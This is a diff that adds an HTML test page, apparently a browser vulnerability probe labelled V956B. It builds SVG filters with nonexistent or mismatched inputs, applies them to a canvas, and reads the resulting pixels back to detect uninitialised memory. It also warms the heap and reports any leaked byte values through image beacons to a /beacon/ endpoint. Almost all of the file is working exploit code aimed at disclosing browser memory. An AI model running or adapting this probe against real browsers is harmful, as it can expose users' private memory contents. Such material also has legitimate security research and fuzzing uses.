@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V956B</title></head>
+<body><pre id="out">V956B — SVG/Canvas filter uninit read (324896/FilterImage + v597-style, B)</pre>
+
+<svg width="0" height="0" style="position:absolute">
+  <!-- v597-style: nonexistent input -->
+  <filter id="f1" x="0" y="0" width="200" height="200" filterUnits="userSpaceOnUse">
+    <feColorMatrix in="nonexistent" type="matrix" values="1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0"/>
+  </filter>
+  <filter id="f2" x="0" y="0" width="200" height="200" filterUnits="userSpaceOnUse">
+    <feMerge><feMergeNode in="nonexistent"/></feMerge>
+  </filter>
+  <filter id="f3" x="0" y="0" width="200" height="200" filterUnits="userSpaceOnUse">
+    <feComposite in="SourceGraphic" in2="nonexistent" operator="in"/>
+  </filter>
+  <filter id="f4" x="0" y="0" width="200" height="200" filterUnits="userSpaceOnUse">
+    <feOffset in="nonexistent" dx="0" dy="0"/>
+  </filter>
+  <!-- 324896-inspired: try to force copy/subregion mismatch (primitive region outside input/zero source) -->
+  <filter id="f5" x="-500" y="-500" width="100" height="100" filterUnits="userSpaceOnUse">
+    <feOffset in="SourceGraphic" dx="0" dy="0"/>
+  </filter>
+  <filter id="f6" x="0" y="0" width="200" height="200" filterUnits="userSpaceOnUse">
+    <feFlood flood-color="rgba(0,0,0,0)" x="500" y="500" width="10" height="10"/>
+    <feBlend in="SourceGraphic" in2="flood" mode="normal"/>
+  </filter>
+  <filter id="f7" x="0" y="0" width="200" height="200" filterUnits="userSpaceOnUse">
+    <feGaussianBlur in="nonexistent" stdDeviation="2"/>
+  </filter>
+  <filter id="f8" x="0" y="0" width="200" height="200" filterUnits="userSpaceOnUse">
+    <feDisplacementMap in="SourceGraphic" in2="nonexistent" scale="10"/>
+  </filter>
+</svg>
+<canvas id="c" width="200" height="200" style="display:none"></canvas>
+
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  try{new Image().src='/beacon/V956B-'+tag+'?d='+encodeURIComponent(String(body).slice(0,700))+'&t='+Date.now()+'&s=1';}catch(e){}
+}
+function hx(n){var s=n.toString(16);return s.length<2?'0'+s:s;}
+var FILTERS=['f1','f2','f3','f4','f5','f6','f7','f8'];
+var ctx=document.getElementById('c').getContext('2d');
+var idx=0, totalHits=0;
+
+function testOne(){
+  if(idx>=FILTERS.length){
+    bk('DONE','totalHits='+totalHits+'|324896/FilterImage uninit+v597-style; nonzero/unexpected=>candidate');
+    say('\nV956B complete. totalHits='+totalHits);
+    return;
+  }
+  var fid=FILTERS[idx++];
+  bk('T-PRE',fid);
+  try{
+    // warm heap a bit
+    var junk=[]; for(var i=0;i<2000;i++) junk.push({x:i,a:[i,i+1],s:'j'+i}); junk=null;
+    ctx.clearRect(0,0,200,200);
+    // draw a base so SourceGraphic exists where relevant
+    ctx.fillStyle='rgba(128,128,128,0.5)';
+    ctx.fillRect(0,0,200,200);
+    ctx.save();
+    ctx.filter='url(#'+fid+')';
+    ctx.fillRect(0,0,200,200);
+    ctx.restore();
+    var d=ctx.getImageData(0,0,200,200).data;
+    var nz=0, unexp=0, samp='';
+    for(var j=0;j<d.length;j++){
+      if(d[j]!==0) nz++;
+      // allow premultiplied gray ~64,128 range and transparent black; flag other patterns
+      if(d[j]!==0 && d[j]!==64 && d[j]!==63 && d[j]!==65 && d[j]!==128 && d[j]!==127 && d[j]!==129 && d[j]!==255 && d[j]!==254 && d[j]!==126){
+        unexp++;
+        if(samp.length<48) samp+=hx(d[j]);
+      }
+    }
+    var res=fid+'|nz='+nz+'|unexp='+unexp+(samp?'|hex='+samp:'');
+    bk('RES',res);
+    say(fid+': nz='+nz+' unexp='+unexp+(samp?' hex='+samp.slice(0,24):''));
+    if(unexp>0){ totalHits++; bk('HIT',res); }
+  }catch(e){ bk('ERR',fid+'|'+String(e&&e.name)+':'+String(e&&e.message||e).slice(0,120)); say(fid+' ERR '+e); }
+  setTimeout(testOne,40);
+}
+bk('BOOT','324896 FilterImage copyPixelBuffer uninit-on-fail + v597 nonexistent inputs; JS-readable via getImageData; no WebGL/WebCodecs');
+testOne();
+</script>
+</body></html>
